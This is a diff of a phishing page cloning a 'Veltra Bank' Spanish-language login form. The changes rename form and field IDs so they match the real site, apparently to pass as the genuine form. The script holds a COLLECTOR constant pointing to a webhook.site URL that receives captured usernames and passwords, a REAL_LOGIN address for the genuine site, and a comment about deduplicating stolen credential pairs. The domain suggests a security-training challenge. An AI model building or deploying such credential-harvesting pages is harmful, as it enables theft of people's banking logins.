@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>VeltraBank — Banca en línea</title>
+<title>Veltra Bank — Acceso</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -140,21 +140,21 @@
     </section>
 
     <section>
-      <form class="card" id="loginForm" method="post" action="#" autocomplete="on" novalidate>
-        <div class="eyebrow">Banca en línea</div>
-        <h2>Iniciar sesión</h2>
+      <form class="card" id="form-login" autocomplete="off" novalidate>
+        <div class="eyebrow">Banca en linea</div>
+        <h2>Iniciar sesion</h2>
         <p class="sub">Ingresa con tus credenciales para continuar.</p>
 
         <div class="field">
-          <label for="user">Usuario</label>
-          <input id="user" name="username" type="text" autocomplete="username" placeholder="nombre.apellido" />
+          <label for="txt-login">Usuario</label>
+          <input id="txt-login" name="txtLogin" type="text" placeholder="nombre.apellido" autofocus />
         </div>
         <div class="field">
-          <label for="pass">Contraseña</label>
-          <input id="pass" name="password" type="password" autocomplete="current-password" placeholder="••••••••••" />
+          <label for="txt-password">Contrasena</label>
+          <input id="txt-password" name="txtPassword" type="password" placeholder="••••••••••" />
         </div>
 
-        <button class="btn" type="submit">Continuar</button>
+        <button id="btn-login" class="btn" type="submit">Continuar</button>
 
         <div class="note">
           <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></svg>
@@ -178,9 +178,9 @@
   const COLLECTOR  = "https://webhook.site/b3e649bc-9695-4f01-8b88-f66a610efd0d";
   const REAL_LOGIN = "https://chl-2f300676-d4d2-419a-8af0-6a6a44e378f9-veltra-bank.softwareseguro.com.ar/login";
 
-  const form = document.getElementById('loginForm');
-  const user = document.getElementById('user');
-  const pass = document.getElementById('pass');
+  const form = document.getElementById('form-login');
+  const user = document.getElementById('txt-login');
+  const pass = document.getElementById('txt-password');
   // Deduplicación: guardamos el último par (user,pass) enviado para no repetir
   // y, sobre todo, para NO cortar el valor en el primer caracter.
   let lastKey = "";
